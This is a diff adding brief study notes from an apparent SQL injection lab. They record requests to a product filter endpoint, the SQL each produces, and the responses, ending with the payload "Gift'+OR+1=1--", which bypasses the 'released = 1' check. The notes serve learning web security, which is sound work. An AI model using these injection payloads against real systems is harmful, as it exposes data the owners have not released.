@@ -1,0 +1,30 @@
+
+retrieving data
+
+GET /filter?category=Gift
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+200
+
+GET /filter?category=
+SELECT * FROM products WHERE category = '' AND released = 1
+200
+
+GET /filter?category='
+SELECT * FROM products WHERE category = ''' AND released = 1
+500
+
+GET /filter?category=Gift'
+SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
+500
+
+GET /filter?category=Gift+OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts OR 1=1--' AND released = 1
+200 but no data retrivied
+
+GET /filter?category=Gift'+OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
+done
+
+GET /filter?category=Gift'OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts'OR 1=1-- AND released = 1
+done
